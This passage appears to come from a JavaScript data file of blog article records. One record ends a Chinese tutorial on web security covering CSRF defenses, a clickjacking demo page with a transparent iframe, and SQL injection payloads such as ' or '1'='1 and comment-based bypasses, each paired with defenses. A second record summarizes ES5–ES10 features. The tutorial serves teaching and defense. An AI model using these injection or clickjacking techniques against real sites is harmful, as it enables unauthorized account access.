origin属性\n\n通过XMLHttpRequest、Fetch发起的跨站请求或者Post方法发送请求时，都会带上origin,所以服务器可以优先判断Origin属性，再根据实际情况判断是否使用referer判断。\n\n### 后端使用cookie的SameSite属性\n\n后端响应请求时，set-cookie添加SameSite属性。\n\n> SameSite选项通常由Strict、Lax和None三个值\n\n- Strict最为严格，如果cookie设置了Strict，那么浏览器会完全禁止第三方Cookie。\n- Lax相对宽松一点，在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交Get的表单都会携带cookie.但是如果在第三方站点中使用Post方法或者通过img、iframe等标签加载的URL,都不会携带Cookie。\n- None, 任何情况下都会发送Cookie。\n\n### csrfToken\n\n- 在浏览器向服务器发起请求时，服务器生成一个CSRF Token（字符串）发送给浏览器，然后将该字符串放入页面中\n- 浏览器请求时（如表单提交）需要带上这个CSRF Token。服务器收到请求后，验证CSRF是否合法，如果不合法拒绝即可。\n\n### 使用token 并验证\n\n既然浏览器会自动带上同域的cookie，那么将登录信息就不存cookie里面，存localstorage里，发起网络请求的时候，不会默认带上同域的localstorage，然后将登录信息存在localstorage里面，在请求的时候，手动带上这个localstorage，后端再进行判断就可以了。\n\n# 点击劫持\n\n## 原理\n\n将要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。点击按钮实际点击的是iframe里面的东西。\n\n举个例子：比如我在b站发了一个视频，我希望别人都给我一键三连，但是很明显很多人都是喜欢白嫖，不会点击一键三连，我就使用iframe，将b站嵌入我的一个网站里面，然后把iframe设置透明，用定位把一个按钮定位到一键三连的位置那里，并且把网站设置的吸引人一点，比如点击抽奖或者点击获取最新信息等等，这样别人点击了按钮，实际上点击的是iframe的一键三连按钮，这样就达到了我的目的。\n\nps：但实际上点击一键三连都需要登录，如果iframe获取不到你之前在b站的登录状态，也是白搭。而且在现在的2021年，对iframe的限制也越来越多，比如从谷歌浏览器的Chrome 80版本后面开始，浏览器的Cookie新增加了一个SameSite属性，用来防止CSRF攻击和用户追踪。该功能默认已开启（SameSite：Lax）。即iframe拿不到外面的cookie了。\n\n```html\n<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="UTF-8">\n    <meta http-equiv="X-UA-Compatible" content="IE=edge">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Document</title>\n    <style>\n        .wrap {\n            position: relative;\n        }\n\n        .iframe {\n            position: absolute;\n            width: 600px;\n            height: 600px;\n            /* opacity: 0.5; */\n            opacity: 0;\n        }\n\n        .img {\n            position: absolute;\n            width: 600px;\n            height: 600px;\n            background-color: pink;\n        }\n\n        .btn {\n            position: absolute;\n            bottom: 96px;\n            left: 6px;\n            display: inline-block;\n            padding: 10px 20px;\n            background-color: yellow;\n            border-radius: 4px;\n        }\n    </style>\n</head>\n\n<body>\n    <div class="wrap">\n        <div class="img">\n            <span class="btn">click</span>\n        </div>\n        <iframe class="iframe" src="https://www.zhengbeining.com/csrf/" frameborder="0"></iframe>\n    </div>\n</body>\n\n</html>\n```\n\n## 防范\n\n### 设置http头部X-Frame-Options字段\n\n1. `DENY // 拒绝任何域加载`\n2. `SAMEORIGIN // 允许同源域下加载`\n3. `ALLOW-FROM // 可以定义允许frame加载的页面地址`\n\n可以设置值为deny，设置后，就会拒绝任何域的加载，如果别人iframe嵌入了，浏览器控制台就会报错：\n\nRefused to display \'https://www.zhengbeining.com/\' in a frame because it set \'X-Frame-Options\' to \'deny\'.\n\n# sql注入\n\n## 原理\n\n其实就是利用恶意的sql查询或添加语句插入到应用的输入参数中，具体看案例：\n\n如果后端是这样拼接sql的话：\n\n```js\nlet username = \'admin\'\nlet password = 999\nlet sql = `select * from user where username = \'${username}\' and password = \'${password}\'`\n// select * from user where username = \'admin\' and password = \'999\'\n```\n\n上面的sql就是要找user里面，用户名是admin，密码是999的所有数据。\n\n但是如果用户这样输入用户名密码：\n\n```sql\nlet username = \'admin\'\nlet password = "1 \'or \'1\'=\'1"\nlet sql = `select * from user where username = \'${username}\' and password = \'${password}\'`\n// select * from user where username = \'admin\' and password = \'1 \'or \'1\'=\'1\'\n```\n\n上面的sql是查找user里面，用户名是admin，密码是1，或者1=1的所有数据，不管有没有找到用户名是admin，密码是1的数据，但是后面的1=1是一定成立的，而且前面的条件和后面的条件中间用的是or，所以，只要满足：（用户名是admin，密码是1）或者（1=1）的其中一个或者都满足，就会查询user里面的数据，这里是一定可以查询到数据的！\n\n或者用户这样输入用户名密码：\n\n```js\nlet username = "admin\' -- "\nlet password = "234"\nlet sql = `select * from user where username = \'${username}\' and password = \'${password}\'`\nconsole.log(sql)  //select * from user where username = \'admin\' -- \' and password = \'234\'\n```\n\n```js\nlet username = "admin\' #"\nlet password = "234"\nlet sql = `select * from user where username = \'${username}\' and password = \'${password}\'`\nconsole.log(sql)  //select * from user where username = \'admin\' #\' and password = \'234\'\n```\n\n上面两个sql语句都是利用了sql里面的注释达到sql注入的。\n\n## 防范\n\n### 后端对前端提交内容进行规则限制\n\n> 比如：正则表达式\n\n### 不要使用字符串拼接\n\n> 使用一些工具拼接，比如node后端可以使用mysql2里面的query或execute\n\n```js\nconst conn = await mysql.createConnection({\n  host: \'xxxxxxxxxxxxxx.mysql.rds.aliyuncs.com\',\n  user: \'<数据库用户名>\',\n  password: \'<数据库密码>\',\n  database: \'<数据库名称>\',\n  charset: \'utf8mb4\'\n})\nconst [rows, fields] = await conn.query(\n  \'SELECT * FROM `user` where id in (?)\',\n  [userIds])\nconst [rows] = await conn.execute(\n  \'SELECT * FROM `user` where id = ?\',\n  [userId])\n```\n\n# 有待更新\n\n# 参考\n\nhttps://blog.csdn.net/weixin_30867015/article/details/99033645?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&spm=1001.2101.3001.4242\n\nhttp://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html\n\nhttps://blog.csdn.net/onlyliii/article/details/108276843',
      click: 106,
      createdAt: '2021-05-26T11:54:43.000Z',
      updatedAt: '2021-05-26T11:54:43.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 83,
            article_id: 83,
            type_id: 1,
            createdAt: '2021-05-26T11:54:43.000Z',
            updatedAt: '2021-05-26T11:54:43.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 83,
            user_id: 1,
            article_id: 83,
            createdAt: '2021-05-26T11:54:43.000Z',
            updatedAt: '2021-05-26T11:54:43.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 27,
          name: 'web安全',
          color: '#928dc3',
          createdAt: '2021-05-24T05:30:03.000Z',
          updatedAt: '2021-05-24T05:30:03.000Z',
        },
      ],
    },
    {
      id: 82,
      title: 'es3-es10整理',
      is_comment: 1,
      status: 1,
      img: '/1621783325008ECMAScript.png',
      content:
        "# ECMAScript\n\n## es3（ECMAScript 1999）\n\n> 1999年，ECMAScript第三个版本\n\n## ~~es4（ECMAScript 2007）~~\n\n> ECMAScript第四个版本，废弃\n\n## es5（ECMAScript 2009）\n\n> 2009年，ECMAScript第五个版本\n\n### strict模式\n\n'use strict'\n\n### Array新增方法\n\nevery、some 、forEach、filter 、indexOf、lastIndexOf、isArray、map、reduce、reduceRight\n\nPS： 还有其他方法 Function.prototype.bind、String.prototype.trim、Date.now\n\n### Object新增方法\n\n#### Object.getPrototypeOf\n\n`Object.getPrototypeOf()` 方法返回指定对象的原型（内部`[[Prototype]]`属性的值）。返回值：给定对象的原型。如果没有继承属性，则返回 [`null`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null) 。\n\n```js\nvar proto = {};\nvar obj = Object.create(proto);\nObject.getPrototypeOf(obj) === proto; // true\nvar obj1 = {}\nconsole.log(Object.getPrototypeOf(obj1) === Object.prototype)\t//true\n\nvar reg = /a/;\nObject.getPrototypeOf(reg) === RegExp.prototype; // true\n```\n\n**`Object.create()`**方法创建一个新对象，使用现有的对象来提供新创建的对象的__proto__。\n\n可以使用`Object.create()`来实现类式继承。\n\n```js\nvar o;\n\n// 创建一个原型为null的空对象\no = Object.create(null);\n\n\no = {};\n// 以字面量方式创建的空对象就相当于:\no = Object.create(Object.prototype);\n```\n\n#### Object.getOwnPropertyNames\n\n**`Object.getOwnPropertyNames()`**方法返回一个由指定对象的所有自身属性的属性名（包括不可枚举属性但不包括Symbol值作为名称的属性）组成的数组。\n\n```js\nvar arr = [\"a\", \"b\", \"c\"];\nconsole.log(Object.getOwnPropertyNames(arr).sort()); // [\"0\", \"1\", \"2\", \"length\"]\n\n// 类数组对象\nvar obj = { 0: \"a\", 1: \"b\", 2: \"c\"};\nconsole.log(Object.getOwnPropertyNames(obj).sort()); // [\"0\", \"1\", \"2\"]\n\n// 使用Array.forEach输出属性名和属性值\nObject.getOwnPropertyNames(obj).forEach(function(val, idx, array) {\n  console.log(val + \" -> \" + obj[val]);\n});\n// 输出\n// 0 -> a\n// 1 -> b\n// 2 -> c\n```\n\n#### Object.getOwnPropertyDescriptor\n\n**`Object.getOwnPropertyDescriptor()`** 方法返回指定对象上一个自有属性对应的属性描述符。（自有属性指的是直接赋予该对象的属性，不需要从原型链上进行查找的属性）\n\n```js\nvar o, d;\n\no = { get foo() { return 17; } };\nd = Object.getOwnPropertyDescriptor(o, \"foo\");\n// d {\n//   configurable: true,\n//   enumerable: true,\n//   get: /*the getter function*/,\n//   set: undefined\n// }\n\no = { bar: 42 };\nd = Object.getOwnPropertyDescriptor(o, \"bar\");\n// d {\n//   configurable: true,\n//   enumerable: true,\n//   value: 42,\n//   writable: true\n// }\n\no = {};\nObject.defineProperty(o, \"baz\", {\n  value: 8675309,\n  writable: false,\n  enumerable: false\n});\nd = Object.getOwnPropertyDescriptor(o, \"baz\");\n// d {\n//   value: 8675309,\n//   writable: false,\n//   enumerable: false,\n//   configurable: false\n// }\n```\n\n\n\n#### Object.defineProperty\n\nvue2使用的响应式就是根据Object.defineProperty进行的。\n\n```js\nvar o = {}; // 创建一个新对象\n\n// 在对象中添加一个属性与数据描述符的示例\nObject.defineProperty(o, \"a\", {\n  value : 37,\n  writable : true,\n  enumerable : true,\n  configurable : true\n});\n\n// 对象 o 拥有了属性 a，值为 37\n```\n\n#### Object.defineProperties\n\n```js\nvar obj = {};\nObject.defineProperties(obj, {\n  'property1': {\n    value: true,\n    writable: true\n  },\n  'property2': {\n    value: 'Hello',\n    writable: false\n  }\n});\n```\n\n\n\n\n\n#### Object.keys\n\n在ES5里，如果此方法的参数不是对象（而是一个原始值），那么它会抛出 TypeError。在ES2015中，非对象的参数将被强制转换为一个对象。\n\n```js\nObject.keys(\"foo\");\n// TypeError: \"foo\" is not an object (ES5 code)\n\nObject.keys(\"foo\");\n// [\"0\", \"1\", \"2\"]                   (ES2015 code)\n```\n\n#### Object.preventExtensions\n\n`Object.preventExtensions()`方法让一个对象变的不可扩展，也就是永远不能再添加新的属性。\n\n如果一个对象可以添加新的属性，则这个对象是可扩展的。`Object.preventExtensions()`将对象标记为不再可扩展，这样它将永远不会具有它被标记为不可扩展时持有的属性之外的属性。注意，一般来说，不可扩展对象的属性可能仍然可被*删除*。尝试将新属性添加到不可扩展对象将静默失败或抛出[`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError)（最常见的情况是[strict mode (en-US)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode)中，但不排除其他情况）。\n\n`Object.preventExtensions()`仅阻止添加自身的属性。但其对象类型的原型依然可以添加新的属性。\n\n该方法使得目标对象的 `[[prototype]]` 不可变；任何重新赋值 `[[prototype]]` 操作都会抛出 `TypeError` 。这种行为只针对内部的 `[[prototype]]` 属性， 目标对象的其它属性将保持可变。\n\n一旦将对象变为不可扩展的对象，就再也不能使其可扩展。\n\n```js\n// Object.preventExtensions将原对象变的不可扩展,并且返回原对象.\nvar obj = {};\nvar obj2 = Object.preventExtensions(obj);\nobj === obj2;  // true\n\n// 字面量方式定义的对象默认是可扩展的.\nvar empty = {};\nObject.isExtensible(empty) //=== true\n\n// ...但可以改变.\nObject.preventExtensions(empty);\nObject.isExtensible(empty) //=== false\n\n// 使用Object.defineProperty方法为一个不可扩展的对象添加新属性会抛出异常.\nvar nonExtensible = { removable: true };\nObject.preventExtensions(nonExtensible);\nObject.defineProperty(nonExtensible, \"new\", { value: 8675309 }); // 抛出TypeError异常\n\n// 在严格模式中,为一个不可扩展对象的新属性赋值会抛出TypeError异常.\nfunction fail()\n{\n  \"use strict\";\n  nonExtensible.newProperty = \"FAIL\"; // throws a TypeError\n}\nfail();\n```\n\n不可扩展对象的原型是不可变的：\n\n```js\nvar fixed = Object.preventExtensions({});\n// throws a 'TypeError'.\nfixed.__proto__ = { oh: 'hai' };\n```\n\n#### Object.isExtensible\n\n`Object.isExtensible()` 方法判断一个对象是否是可扩展的（是否可以在它上面添加新的属性）。\n\n默认情况下，对象是可扩展的：即可以为他们添加新的属性。以及它们的 [`__proto__`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto) 属性可以被更改。[`Object.preventExtensions`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/preventExtensions)，[`Object.seal`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/seal) 或 [`Object.freeze`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze) 方法都可以标记一个对象为不可扩展（non-extensible）。\n\n```js\n// 新对象默认是可扩展的.\nvar empty = {};\nObject.isExtensible(empty); // === true\n\n// Object.preventExtensions可以让它变的不可扩展.\nObject.preventExtensions(empty);\nObject.isExtensible(empty); // === false\n\n// 密封对象是不可扩展的.\nvar sealed = Object.seal({});\nObject.isExtensible(sealed); // === false\n\n// 冻结对象也是不可扩展.\nvar frozen = Object.freeze({});\nObject.isExtensible(frozen); // === false\n```\n\n#### Object.seal\n\n`Object.seal()`方法封闭一个对象，阻止添加新属性并将所有现有属性标记为不可配置。当前属性的值只要原来是可写的就可以改变。\n\n通常，一个对象是[可扩展的](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/isExtensible)（可以添加新的属性）。密封一个对象会让这个对象变的不能添加新属性，且所有已有属性会变的不可配置。属性不可配置的效果就是属性变的不可删除，以及一个数据属性不能被重新定义成为访问器属性，或者反之。但属性的值仍然可以修改。尝试删除一个密封对象的属性或者将某个密封对象的属性从数据属性转换成访问器属性，结果会静默失败或抛出[`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError)（在[严格模式](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Strict_mode) 中最常见的，但不唯一）。\n\n不会影响从原型链上继承的属性。但 [`__proto__`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto) ( ) 属性的值也会不能修改。\n\n返回被密封对象的引用。\n\n```js\nvar obj = {\n  prop: function() {},\n  foo: 'bar'\n};\n\n// 可以添加新的属性\n// 可以更改或删除现有的属性\nobj.foo = 'baz';\nobj.lumpy = 'woof';\ndelete obj.prop;\n\nvar o = Object.seal(obj);\n\no === obj; // true\nObject.isSealed(obj); // === true\n\n// 仍然可以修改密封对象的属性值\nobj.foo = 'quux';\n\n\n// 但是你不能将属性重新定义成为访问器属性\n// 反之亦然\nObject.defineProperty(obj, 'foo', {\n  get: function() { return 'g'; }\n}); // throws a TypeError\n\n// 除了属性值以外的任何变化，都会失败.\nobj.quaxxor = 'the friendly duck';\n// 添加属性将会失败\ndelete obj.foo;\n// 删除属性将会失败\n\n// 在严格模式下，这样的尝试将会抛出错误\nfunction fail() {\n  'use strict';\n  delete obj.foo; // throws a TypeError\n  obj.sparky = 'arf'; // throws a TypeError\n}\nfail();\n\n// 通过Object.defineProperty添加属性将会报错\nObject.defineProperty(obj, 'ohai', {\n  value: 17\n}); // throws a TypeError\nObject.defineProperty(obj, 'foo', {\n  value: 'eit'\n}); // 通过Object.defineProperty修改属性值\n```\n\n#### Object.isSealed\n\n**`Object.isSealed()`** 方法判断一个对象是否被密封。\n\n如果这个对象是密封的，则返回 `true`，否则返回 `false`。密封对象是指那些不可 [`扩展`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/isExtensible) 的，且所有自身属性都不可配置且因此不可删除（但不一定是不可写）的对象。\n\n```js\n// 新建的对象默认不是密封的.\nvar empty = {};\nObject.isSealed(empty); // === false\n\n// 如果你把一个空对象变的不可扩展,则它同时也会变成个密封对象.\nObject.preventExtensions(empty);\nObject.isSealed(empty); // === true\n\n// 但如果这个对象不是空对象,则它不会变成密封对象,因为密封对象的所有自身属性必须是不可配置的.\nvar hasProp = { fee: \"fie foe fum\" };\nObject.preventExtensions(hasProp);\nObject.isSealed(hasProp); // === false\n\n// 如果把这个属性变的不可配置,则这个属性也就成了密封对象.\nObject.defineProperty(hasProp, \"fee\", { configurable: false });\nObject.isSealed(hasProp); // === false\nObject.isSealed(hasProp.fee); // === true\n\n// 最简单的方法来生成一个密封对象,当然是使用Object.seal.\nvar sealed = {};\nObject.seal(sealed);\nObject.isSealed(sealed); // === true\n\n// 一个密封对象同时也是不可扩展的.\nObject.isExtensible(sealed); // === false\n\n// 一个密封对象也可以是一个冻结对象,但不是必须的.\nObject.isFrozen(sealed); // === true ，所有的属性都是不可写的\nvar s2 = Object.seal({ p: 3 });\nObject.isFrozen(s2); // === false， 属性\"p\"可写\n\nvar s3 = Object.seal({ get p() { return 0; } });\nObject.isFrozen(s3); // === true ，访问器属性不考虑可写不可写,只考虑是否可配置\n```\n\n\n\n#### Object.freeze\n\n**`Object.freeze()`** 方法可以**冻结**一个对象。一个被冻结的对象再也不能被修改；冻结了一个对象则不能向这个对象添加新的属性，不能删除已有属性，不能修改该对象已有属性的可枚举性、可配置性、可写性，以及不能修改已有属性的值。此外，冻结一个对象后该对象的原型也不能被修改。`freeze()` 返回和传入的参数相同的对象。\n\n被冻结对象自身的所有属性都不可能以任何方式被修改。任何修改尝试都会失败，无论是静默地还是通过抛出[`TypeError`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError)异常（最常见但不仅限于[strict mode](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Strict_mode)）。\n\n数据属性的值不可更改，访问器属性（有getter和setter）也同样（但由于是函数调用，给人的错觉是还是可以修改这个属性）。如果一个属性的值是个对象，则这个对象中的属性是可以修改的，除非它也是个冻结对象。数组作为一种对象，被冻结，其元素不能被修改。没有数组元素可以被添加或移除。\n\n这个方法返回传递的对象，而不是创建一个被冻结的副本。\n\n```js\nvar obj = {\n  prop: function() {},\n  foo: 'bar'\n};\n\n// 新的属性会被添加, 已存在的属性可能\n// 会被修改或移除\nobj.foo = 'baz';\nobj.lumpy = 'woof';\ndelete obj.prop;\n\n// 作为参数传递的对象与返回的对象都被冻结\n// 所以不必保存返回的对象（因为两个对象全等）\nvar o = Object.freeze(obj);\n\no === obj; // true\nObject.isFrozen(obj); // === true\n\n// 现在任何改变都会失效\nobj.foo = 'quux'; // 静默地不做任何事\n// 静默地不添加此属性\nobj.quaxxor = 'the friendly duck';\n\n// 在严格模式，如此行为将抛出 TypeErrors\nfunction fail(){\n  'use strict';\n  obj.foo = 'sparky'; // throws a TypeError\n  delete obj.quaxxor; // 返回true，因为quaxxor属性从来未被添加\n  obj.sparky = 'arf'; // throws a TypeError\n}\n\nfail();\n\n// 试图通过 Object.defineProperty 更改属性\n// 下面两个语句都会抛出 TypeError.\nObject.defineProperty(obj, 'ohai', { value: 17 });\nObject.defineProperty(obj, 'foo', { value: 'eit' });\n\n// 也不能更改原型\n// 下面两个语句都会抛出 TypeError.\nObject.setPrototypeOf(obj, { x: 20 })\nobj.__proto__ = { x: 20 }\n```\n\n#### Object.isFrozen\n\n`Object.isFrozen()`方法判断一个对象是否被[冻结](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze)。\n\n```js\n// 一个对象默认是可扩展的,所以它也是非冻结的.\nObject.isFrozen({}); // === false\n\n// 一个不可扩展的空对象同时也是一个冻结对象.\nvar vacuouslyFrozen = Object.preventExtensions({});\nObject.isFrozen(vacuouslyFrozen) //=== true;\n\n// 一个非空对象默认也是非冻结的.\nvar oneProp = { p: 42 };\nObject.isFrozen(oneProp) //=== false\n\n// 让这个对象变的不可扩展,并不意味着这个对象变成了冻结对象,\n// 因为p属性仍然是可以配置的(而且可写的).\nObject.preventExtensions(oneProp);\nObject.isFrozen(oneProp) //=== false\n\n// 此时,如果删除了这个属性,则它会成为一个冻结对象.\ndelete oneProp.p;\nObject.isFrozen(oneProp) //=== true\n\n// 一个不可扩展的对象,拥有一个不可写但可配置的属性,则它仍然是非冻结的.\nvar nonWritable = { e: \"plep\" };\nObject.preventExtensions(nonWritable);\nObject.defineProperty(nonWritable, \"e\", { writable: false }); // 变得不可写\nObject.isFrozen(nonWritable) //=== false\n\n// 把这个属性改为不可配置,会让这个对象成为冻结对象.\nObject.defineProperty(nonWritable, \"e\", { configurable: false }); // 变得不可配置\nObject.isFrozen(nonWritable) //=== true\n\n// 一个不可扩展的对象,拥有一个不可配置但可写的属性,则它仍然是非冻结的.\nvar nonConfigurable = { release: \"the kraken!\" };\nObject.preventExtensions(nonConfigurable);\nObject.defineProperty(nonConfigurable, \"release\", { configurable: false });\nObject.isFrozen(nonConfigurable) //=== false\n\n// 把这个属性改为不可写,会让这个对象成为冻结对象.\nObject.defineProperty(nonConfigurable, \"release\", { writable: false });\nObject.isFrozen(nonConfigurable) //=== true\n\n// 一个不可扩展的对象,值拥有一个访问器属性,则它仍然是非冻结的.\nvar accessor = { get food() { return \"yum\"; } };\nObject.preventExtensions(accessor);\nObject.isFrozen(accessor) //=== false\n\n// ...但把这个属性改为不可配置,会让这个对象成为冻结对象.\nObject.defineProperty(accessor, \"food\", { configurable: false });\nObject.isFrozen(accessor) //=== true\n\n// 使用Object.freeze是冻结一个对象最方便的方法.\nvar frozen = { 1: 81 };\nObject.isFrozen(frozen) //=== false\nObject.freeze(frozen);\nObject.isFrozen(frozen) //=== true\n\n// 一个冻结对象也是一个密封对象.\nObject.isSealed(frozen) //=== true\n\n// 当然,更是一个不可扩展的对象.\nObject.isExtensible(frozen) //=== false\n```\n\n\n\n## es6（ECMAScript 2015）\n\n> 2015年，ECMAScript第六个版本\n\n### 块级作用域 \n\nlet，const\n\n`const`定义常量与使用`let` 定义的变量相似：\n\n- 二者都是块级作用域\n- 都不能和它所在作用域内的其他变量或函数拥有相同的名称\n\n两者还有以下两点区别：\n\n- `const`声明的常量必须初始化，而`let`声明的变量不用\n- const 定义常量的值不能通过再赋值修改，也不能再次声明。而 let 定义的变量值可以修改，但也不能再次声明。\n\n### 对象字面量的属性赋值简写\n\n```js\nvar obj = {name,age,say(){}}\n// 约等于\nvar obj = {name:name,age:age,say:function(){}}\n```\n\n### 解构赋值\n\n```js\nlet info = { name: \"Bob\", age: 18 };\nlet { name: n, age: a } = info; // 相当于 n = \"Bob\", a = 18\n```\n\n### 函数参数默认值\n\n```js\n// 基本用法\nfunction say(name = 'hss', age = 18) {\n    console.log(name, age);\n}\nsay()           //hss,18\nsay('why', 21)  //why,21\nsay('why')      //why,18\nsay(22)         //22,18\n\n// 与解构赋值默认值结合\nfunction pet({ name = 'cat', age = 3 }) {\n    console.log(name, age);\n}\npet({})                         //cat,3\npet({ name: 'dog', age: 4 })    //dog,4\npet({age:5})                    //cat,5\n\n// 双重默认值\nfunction son({name='tom',age=10}={}){\n    console.log(name,age);\n}\nson()               //tom,10\nson({name:'lili'})  //lili,10\nson({age:14})       //tom,14\n```\n\n###  扩展/剩余运算符\n\n```js\nvar arr = [1, 2, 3]\nconsole.log(arr);       //[1, 2, 3]\nconsole.log(...arr);    //1 2 3\nvar arr1 = [2, 3, 4]\nvar arr2 = [5, 6, 7]\nvar arr3 = [...arr1, ...arr2]\nconsole.log(arr3);  //[2, 3, 4, 5, 6, 7]\nvar obj1 = { name: 'hss', age: 21 }\n// console.log(...obj1);   //报错Uncaught TypeError: Found non-callable @@iterator\nconsole.log({ ...obj1 }); //{name: \"hss\", age: 21}\n\n// 剩余运算符\nvar obj2 = { name: 'hss', age: 21, hobby: 'code' }\nvar { age, ...obj3 } = obj2\nconsole.log(obj3);  //{name: \"hss\", hobby: \"code\"}\n```\n\n### 箭头函数\n\n箭头函数没有自己的`this`，`arguments`，`super`或`new.target`。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数。\n\n### 字符串模板\n\n```js\nvar name = 'hss'\nvar str = `${name},喜欢code`\nconsole.log(str)    //hss,喜欢code\n```\n\n### Iterators（迭代器）+ for..of\n\n### 生成器 （Generators）\n\n### Class\n\n类表达式：\n\n```js\nlet Foo = class {\n  constructor() {}\n  bar() {\n    return \"Hello World!\";\n  }\n};\n\nlet instance = new Foo();\ninstance.bar();\n// \"Hello World!\"\n```\n\nClass和类表达式一样，类声明体在[严格模式](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Strict_mode)下运行。构造函数是可选的。\n\n类声明不可以提升（这与[函数声明](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/function)不同）。\n\n### Modules\n\nexport、export default、和import\n\n### Map + Set + WeakMap + WeakSet\n\n### Proxy\n\nvue3使用的响应式就是根据Proxy对象进行的。\n\n### Promises\n\n## es7（ECMAScript 2016）\n\n> 2016年，ECMAScript第七个版本\n\n### Array.prototype.includes()\n\n## es8（ECMAScript 2017）\n\n> 2017年，ECMAScript第八个版本\n\n### async/await\n\n### Object.values()\n\nMDN：`Object.values()`方法返回一个给定对象自身的所有可枚举属性值的数组，值的顺序与使用[`for...in`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...in)循环的顺序相同 ( 区别在于 for-in 循环枚举原型链中的属性 )。\n\n即：`Object.values()`是一个与`Object.keys()`类似的新函数，但返回的是Object自身属性的所有值，不包括继承的值。\n\n假设我们要遍历如下对象`obj`的所有值：\n\n```js\nconst obj = {a: 1, b: 2, c: 3};\n```\n\n> 不使用Object.values() :ES6\n\n```js\nconst obj = {a: 1, b: 2, c: 3};\nconst vals = Object.keys(obj).map(key=>obj[key]);\nconsole.log(vals);//[1, 2, 3]\n```\n\n> 使用Object.values() :ES8\n\n```js\nconst obj = {a: 1, b: 2, c: 3};\nconst values = Object.values(obj);\nconsole.log(values);//[1, 2, 3]\n```\n\n### Object.entries()\n\nMDN：`Object.entries()`方法返回一个给定对象自身可枚举属性的键值对数组，其排列与使用 [`for...in`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...in) 循环遍历该对象时返回的顺序一致（区别在于 for-in 循环还会枚举原型链中的属性）。\n\n```js\nconst obj = { foo: 'bar', baz: 42 };\nconsole.log(Object.entries(obj)); // [ ['foo', 'bar'], ['baz', 42] ]\n\n// array like object\nconst obj = { 0: 'a', 1: 'b', 2: 'c' };\nconsole.log(Object.entries(obj)); // [ ['0', 'a'], ['1', 'b'], ['2', 'c'] ]\n\n// array like object with random key ordering\nconst anObj = { 100: 'a', 2: 'b', 7: 'c' };\nconsole.log(Object.entries(anObj)); // [ ['2', 'b'], ['7', 'c'], ['100', 'a'] ]\n```\n\n## es9（ECMAScript 2018）\n\n> 2018年，ECMAScript第九个版本\n\n## es10（ECMAScript 2019）\n\n> 2019年，ECMAScript第十个版本",
      click: 75,
      createdAt: '2021-05-23T15:22:08.000Z',
      updatedAt: '2021-05-23T15:22:08.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 82,
            article_id: 82,
            type_id: 1,
            createdAt: '2021-05-23T15:22:08.000Z',
            updatedAt: '2021-05-23T15:22:08.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 82,
            user_id: 1,
            article_id: 82,
            createdAt: '2021-05-23T15:22:08.000Z',
            updatedAt: '2021-05-23T15:22:08.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 81,
      title: 'webpack5手动搭建vuecli',
      is_comment: 1,
      status: 1,
      img: '/1621179672918webpack5.png',
      content:
